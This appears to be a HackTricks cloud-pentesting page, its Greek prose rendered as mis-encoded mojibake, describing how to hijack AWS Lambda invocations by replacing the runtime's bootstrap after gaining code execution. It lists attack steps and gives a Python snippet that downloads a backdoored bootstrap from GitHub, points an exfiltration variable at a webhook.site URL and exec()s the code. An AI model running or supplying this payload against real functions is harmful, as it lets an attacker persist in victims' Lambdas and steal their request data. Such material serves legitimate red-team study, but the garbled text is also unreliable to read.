# AWS - Steal Lambda Requests

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ ÎºÎ±Î¹ ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ ÎºÎ±Î¹ ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾Ï„Îµ Ï„Î¿ HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ hacking tricks Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± ÏƒÏ„Î¿ github.

</details>
{% endhint %}

## Lambda Flow

<figure><img src="../../../../.gitbook/assets/image (152).png" alt=""><figcaption><p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/lambda_poc_2_arch.png">https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/lambda_poc_2_arch.png</a></p></figcaption></figure>

1. **Slicer** ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± ÎµÎºÏ„ÏŒÏ‚ Ï„Î¿Ï… container Ï€Î¿Ï… **ÏƒÏ„Î­Î»Î½ÎµÎ¹** **invocations** ÏƒÏ„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± **init**.
2. Î— Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± init Î±ÎºÎ¿ÏÎµÎ¹ ÏƒÏ„Î·Î½ Ï€ÏŒÏÏ„Î± **9001** ÎµÎºÎ¸Î­Ï„Î¿Î½Ï„Î±Ï‚ Î¼ÎµÏÎ¹ÎºÎ¬ ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Î½Ï„Î± endpoints:
* **`/2018-06-01/runtime/invocation/next`** â€“ Î»Î®ÏˆÎ· Ï„Î¿Ï… ÎµÏ€ÏŒÎ¼ÎµÎ½Î¿Ï… invocation event
* **`/2018-06-01/runtime/invocation/{invoke-id}/response`** â€“ ÎµÏ€Î¹ÏƒÏ„ÏÎ¿Ï†Î® Ï„Î·Ï‚ Î±Ï€Î¬Î½Ï„Î·ÏƒÎ·Ï‚ Ï„Î¿Ï… handler Î³Î¹Î± Ï„Î¿ invoke
* **`/2018-06-01/runtime/invocation/{invoke-id}/error`** â€“ ÎµÏ€Î¹ÏƒÏ„ÏÎ¿Ï†Î® ÎµÎ½ÏŒÏ‚ ÏƒÏ†Î¬Î»Î¼Î±Ï„Î¿Ï‚ ÎµÎºÏ„Î­Î»ÎµÏƒÎ·Ï‚
3. Î¤Î¿ **bootstrap.py** Î­Ï‡ÎµÎ¹ Î­Î½Î±Î½ Î²ÏÏŒÏ‡Î¿ Ï€Î¿Ï… Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ invocations Î±Ï€ÏŒ Ï„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± init ÎºÎ±Î¹ ÎºÎ±Î»ÎµÎ¯ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± Ï„Ï‰Î½ Ï‡ÏÎ·ÏƒÏ„ÏÎ½ Î³Î¹Î± Î½Î± Ï„Î± Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„ÎµÎ¯ (**`/next`**).
4. Î¤Î­Î»Î¿Ï‚, Ï„Î¿ **bootstrap.py** ÏƒÏ„Î­Î»Î½ÎµÎ¹ ÏƒÏ„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± init Ï„Î·Î½ **Î±Ï€Î¬Î½Ï„Î·ÏƒÎ·**

Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Ï„Î¿ bootstrap Ï†Î¿ÏÏ„ÏÎ½ÎµÎ¹ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î· Ï‰Ï‚ module, Î¿Ï€ÏŒÏ„Îµ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎºÏÎ´Î¹ÎºÎ± Î±Ï€ÏŒ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î· ÏƒÏ…Î¼Î²Î±Î¯Î½ÎµÎ¹ Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÎ¬ ÏƒÎµ Î±Ï…Ï„Î® Ï„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î±.

## ÎšÎ»Î¿Ï€Î® Î‘Î¹Ï„Î·Î¼Î¬Ï„Ï‰Î½ Lambda

ÎŸ ÏƒÏ„ÏŒÏ‡Î¿Ï‚ Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ ÎµÏ€Î¯Î¸ÎµÏƒÎ·Ï‚ ÎµÎ¯Î½Î±Î¹ Î½Î± ÎºÎ¬Î½ÎµÎ¹ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± Ï„Ï‰Î½ Ï‡ÏÎ·ÏƒÏ„ÏÎ½ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î¼Î¹Î± ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± **`bootstrap.py`** Î¼Î­ÏƒÎ± ÏƒÏ„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± **`bootstrap.py`** Ï€Î¿Ï… Ï‡ÎµÎ¹ÏÎ¯Î¶ÎµÏ„Î±Î¹ Ï„Î¿ ÎµÏ…Î¬Î»Ï‰Ï„Î¿ Î±Î¯Ï„Î·Î¼Î±. ÎœÎµ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ Ï„ÏÏŒÏ€Î¿, Î· **ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î· bootstrap** Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± Î¸Î± Î±ÏÏ‡Î¯ÏƒÎµÎ¹ Î½Î± **Î¼Î¹Î»Î¬ÎµÎ¹ Î¼Îµ Ï„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± init** Î³Î¹Î± Î½Î± Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„ÎµÎ¯ Ï„Î± Î±Î¹Ï„Î®Î¼Î±Ï„Î± ÎµÎ½Ï Î· **Î½ÏŒÎ¼Î¹Î¼Î·** bootstrap ÎµÎ¯Î½Î±Î¹ **Ï€Î±Î³Î¹Î´ÎµÏ…Î¼Î­Î½Î·** ÎµÎºÏ„ÎµÎ»ÏÎ½Ï„Î±Ï‚ Ï„Î·Î½ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î·, Î¿Ï€ÏŒÏ„Îµ Î´ÎµÎ½ Î¸Î± Î¶Î·Ï„Î®ÏƒÎµÎ¹ Î±Î¹Ï„Î®Î¼Î±Ï„Î± Î±Ï€ÏŒ Ï„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± init.

Î‘Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Î­Î½Î± Î±Ï€Î»ÏŒ Î­ÏÎ³Î¿ ÎºÎ±Î¸ÏÏ‚ Î¿ ÎºÏÎ´Î¹ÎºÎ±Ï‚ Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î· ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î· Î½ÏŒÎ¼Î¹Î¼Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± **`bootstrap.py`**. ÎˆÏ„ÏƒÎ¹, Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ:

* **ÎÎ± ÏƒÏ„ÎµÎ¯Î»ÎµÎ¹ Î­Î½Î± ÏˆÎµÏÏ„Î¹ÎºÎ¿ Î±Ï€Î¿Ï„Î­Î»ÎµÏƒÎ¼Î± Ï„Î¿Ï… Ï„ÏÎ­Ï‡Î¿Î½Ï„Î¿Ï‚ invocation ÏƒÏ„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± init**, ÏÏƒÏ„Îµ Î· init Î½Î± Î½Î¿Î¼Î¯Î¶ÎµÎ¹ ÏŒÏ„Î¹ Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± bootstrap Ï€ÎµÏÎ¹Î¼Î­Î½ÎµÎ¹ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± invocations.
* ÎˆÎ½Î± Î±Î¯Ï„Î·Î¼Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÏƒÏ„Î±Î»ÎµÎ¯ ÏƒÏ„Î¿ **`/${invoke-id}/response`**
* Î¤Î¿ invoke-id Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î»Î·Ï†Î¸ÎµÎ¯ Î±Ï€ÏŒ Ï„Î¿ stack Ï„Î·Ï‚ Î½ÏŒÎ¼Î¹Î¼Î·Ï‚ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î±Ï‚ **`bootstrap.py`** Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ [**inspect**](https://docs.python.org/3/library/inspect.html) python module (ÏŒÏ€Ï‰Ï‚ [Ï€ÏÎ¿Ï„ÎµÎ¯Î½ÎµÏ„Î±Î¹ ÎµÎ´Ï](https://github.com/twistlock/lambda-persistency-poc/blob/master/poc/switch\_runtime.py)) Î® Î±Ï€Î»Î¬ Î¶Î·Ï„ÏÎ½Ï„Î±Ï‚ Ï„Î¿ Î¾Î±Î½Î¬ ÏƒÏ„Î¿ **`/2018-06-01/runtime/invocation/next`** (ÏŒÏ€Ï‰Ï‚ [Ï€ÏÎ¿Ï„ÎµÎ¯Î½ÎµÏ„Î±Î¹ ÎµÎ´Ï](https://github.com/Djkusik/serverless\_persistency\_poc/blob/master/gcp/exploit\_files/switcher.py)).
* Î•ÎºÏ„Î­Î»ÎµÏƒÎ· ÎµÎ½ÏŒÏ‚ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿Ï… **`boostrap.py`** Ï€Î¿Ï… Î¸Î± Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„ÎµÎ¯ Ï„Î± ÎµÏ€ÏŒÎ¼ÎµÎ½Î± invocations
* Î“Î¹Î± Î»ÏŒÎ³Î¿Ï…Ï‚ stealthiness, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± ÏƒÏ„ÎµÎ¯Î»ÎµÏ„Îµ Ï„Î¹Ï‚ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÎ¿Ï…Ï‚ Ï„Ï‰Î½ invocations Ï„Î·Ï‚ lambda ÏƒÎµ Î­Î½Î±Î½ C2 Ï€Î¿Ï… ÎµÎ»Î­Î³Ï‡ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿ ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î½Î± Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Î±Î¹Ï„Î®Î¼Î±Ï„Î± ÏŒÏ€Ï‰Ï‚ ÏƒÏ…Î½Î®Î¸Ï‰Ï‚.
* Î“Î¹Î± Î±Ï…Ï„Î® Ï„Î·Î½ ÎµÏ€Î¯Î¸ÎµÏƒÎ·, Î±ÏÎºÎµÎ¯ Î½Î± Ï€Î¬ÏÎµÏ„Îµ Ï„Î¿Î½ Î±ÏÏ‡Î¹ÎºÏŒ ÎºÏÎ´Î¹ÎºÎ± Ï„Î¿Ï… **`bootstrap.py`** Î±Ï€ÏŒ Ï„Î¿ ÏƒÏÏƒÏ„Î·Î¼Î± Î® [**github**](https://github.com/aws/aws-lambda-python-runtime-interface-client/blob/main/awslambdaric/bootstrap.py), Î½Î± Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÏ„Îµ Ï„Î¿Î½ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿ ÎºÏÎ´Î¹ÎºÎ± ÎºÎ±Î¹ Î½Î± Ï„Î¿Î½ ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î±Ï€ÏŒ Ï„Î¿ Ï„ÏÎ­Ï‡Î¿Î½ invocation Ï„Î·Ï‚ lambda.

### Î’Î®Î¼Î±Ï„Î± Î•Ï€Î¯Î¸ÎµÏƒÎ·Ï‚

1. Î’ÏÎµÎ¯Ï„Îµ Î¼Î¹Î± ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± **RCE**.
2. Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÏ„Îµ Î­Î½Î± **ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿** **bootstrap** (Ï€.Ï‡. [https://raw.githubusercontent.com/carlospolop/lambda\_bootstrap\_switcher/main/backdoored\_bootstrap.py](https://raw.githubusercontent.com/carlospolop/lambda\_bootstrap\_switcher/main/backdoored\_bootstrap.py))
3. **Î•ÎºÏ„ÎµÎ»Î­ÏƒÏ„Îµ** Ï„Î¿ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿ bootstrap.

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ ÎµÏÎºÎ¿Î»Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚ Ï„ÏÎ­Ï‡Î¿Î½Ï„Î±Ï‚:
```bash
python3 <<EOF
import os
import urllib3

# Download backdoored bootstrap
http = urllib3.PoolManager()
backdoored_bootstrap_url = "https://raw.githubusercontent.com/carlospolop/lambda_bootstrap_switcher/main/backdoored_bootstrap.py"
new_runtime = http.request('GET', backdoored_bootstrap_url).data

# Load new bootstrap
os.environ['URL_EXFIL'] = "https://webhook.site/c7036f43-ce42-442f-99a6-8ab21402a7c0"

exec(new_runtime)
EOF
```
Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÎµÎ»Î­Î³Î¾Ï„Îµ [https://github.com/carlospolop/lambda\_bootstrap\_switcher](https://github.com/carlospolop/lambda\_bootstrap\_switcher)

## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/](https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/)

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾Ï„Îµ Ï„Î¿ HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î“Î¯Î½ÎµÏ„Îµ Î¼Î­Î»Î¿Ï‚ Ï„Î·Ï‚** ğŸ’¬ [**Î¿Î¼Î¬Î´Î±Ï‚ Discord**](https://discord.gg/hRep4RUj7f) Î® Ï„Î·Ï‚ [**Î¿Î¼Î¬Î´Î±Ï‚ telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ hacking tricks Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± ÏƒÏ„Î¿ github.

</details>
{% endhint %}
